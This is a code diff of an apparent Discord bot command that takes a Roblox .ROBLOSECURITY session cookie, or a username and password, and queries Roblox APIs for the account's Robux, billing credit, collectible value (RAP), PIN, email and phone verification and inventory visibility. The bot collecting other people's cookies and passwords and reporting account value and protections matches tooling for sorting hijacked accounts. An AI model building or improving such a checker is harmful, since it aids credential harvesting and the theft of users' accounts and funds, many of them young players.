@@ -1627,7 +1627,7 @@ async def get_cookie_from_login(username, password, interaction, captcha_data=No
         })
 
     headers = {}
-    if bot.xcsrf_token:
+    if getattr(bot, "xcsrf_token", None):
         headers["x-csrf-token"] = bot.xcsrf_token
 
     async with aiohttp.ClientSession() as session:
@@ -1658,64 +1658,94 @@ async def fetch_roblox_info(cookie):
     async with aiohttp.ClientSession(headers={
         "Cookie": f".ROBLOSECURITY={cookie}"
     }) as session:
-        # User Info
-        async with session.get("https://www.roblox.com/mobileapi/userinfo")  as r:
-            user_info = await r.json()
 
-        # Credit Info
+        # Step 1: Get authenticated user ID
+        async with session.get("https://users.roblox.com/v1/users/authenticated")  as r:
+            if r.status != 200:
+                raise Exception("Invalid or expired .ROBLOSECURITY cookie.")
+            auth_data = await r.json()
+            user_id = auth_data["id"]
+
+        # Step 2: Get user username and description
+        async with session.get(f"https://users.roblox.com/v1/users/{user_id}")  as r:
+            user_data = await r.json()
+            username = user_data["name"]
+            display_name = user_data.get("displayName", username)
+            description = user_data.get("description", "None")
+
+        # Step 3: Robux Balance
+        async with session.get(f"https://economy.roblox.com/v1/users/{user_id}/currency")  as r:
+            economy_data = await r.json()
+            robux = economy_data.get("robux", 0)
+
+        # Step 4: Premium Status
+        async with session.get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership")  as r:
+            premium = await r.json()
+
+        # Step 5: Credit Balance (billing credit)
         async with session.get("https://billing.roblox.com/v1/credit")  as r:
             credit_info = await r.json()
+            credit = credit_info.get("balance", 0)
 
-        # Phone Privacy
+        # Step 6: Email Verified?
+        async with session.get("https://accountinformation.roblox.com/v1/email")  as r:
+            email_info = await r.json()
+            email_verified = email_info.get("verified", False)
+
+        # Step 7: Phone Verified?
         async with session.get("https://accountsettings.roblox.com/v1/privacy")  as r:
             phone_info = await r.json()
+            phone_verified = phone_info.get("phoneDiscovery", "") == "AllUsers"
 
-        # Pin Info
+        # Step 8: PIN Enabled
         async with session.get("https://auth.roblox.com/v1/account/pin")  as r:
             pin_info = await r.json()
+            pin_enabled = pin_info.get("isEnabled", False)
 
-        # Settings
-        async with session.get("https://web.roblox.com/my/settings/json")  as r:
-            settings_info = await r.json()
-
-        # Inventory Access
-        user_id = user_info["UserID"]
+        # Step 9: Can View Inventory
         async with session.get(f"https://inventory.roblox.com/v1/users/{user_id}/can-view-inventory")  as r:
             inv_info = await r.json()
+            inv_public = inv_info.get("canView", False)
 
-        # Primary Group
+        # Step 10: Primary Group
         async with session.get(f"https://groups.roblox.com/v1/users/{user_id}/groups/primary/role")  as r:
             group_info = await r.json()
+            group = group_info.get("group", None)
 
-        # Total RAP
-        rap = 0
-        cursor = ""
-        while True:
-            url = f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?sortOrder=Asc&limit=100"
-            if cursor:
-                url += f"&cursor={cursor}"
-            async with session.get(url) as r:
-                data = await r.json()
-                for item in data.get("data", []):
-                    rap += item.get("recentAveragePrice", 0)
-                cursor = data.get("nextPageCursor")
-                if not cursor:
-                    break
+        # Step 11: Total RAP
+        rap = await get_total_rap(user_id, session)
 
         return {
-            "username": user_info["UserName"],
-            "userid": user_info["UserID"],
-            "description": user_info.get("description", "None"),
-            "robux": user_info["RobuxBalance"],
-            "premium": user_info["IsPremium"],
-            "credit": credit_info.get("balance", 0),
-            "email_verified": settings_info.get("IsEmailVerified", False),
-            "phone_verified": phone_info.get("phoneDiscovery", "") == "AllUsers",
-            "pin_enabled": pin_info.get("isEnabled", False),
-            "inv_public": inv_info.get("canView", False),
-            "group": group_info.get("group", None),
+            "username": username,
+            "userid": user_id,
+            "display_name": display_name,
+            "description": description,
+            "robux": robux,
+            "premium": premium,
+            "credit": credit,
+            "email_verified": email_verified,
+            "phone_verified": phone_verified,
+            "pin_enabled": pin_enabled,
+            "inv_public": inv_public,
+            "group": group,
             "rap": rap
         }
+
+async def get_total_rap(user_id, session):
+    total_rap = 0
+    cursor = ""
+    while True:
+        url = f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?sortOrder=Asc&limit=100"
+        if cursor:
+            url += f"&cursor={cursor}"
+        async with session.get(url) as r:
+            data = await r.json()
+            for item in data.get("data", []):
+                total_rap += item.get("recentAveragePrice", 0)
+            cursor = data.get("nextPageCursor")
+            if not cursor:
+                break
+    return total_rap
 
 @bot.tree.command(name="check", description="Check details of a Roblox account using cookie or credentials.")
 @app_commands.describe(cookie="Provide .ROBLOSECURITY cookie", username="Your Roblox username", password="Your Roblox password")
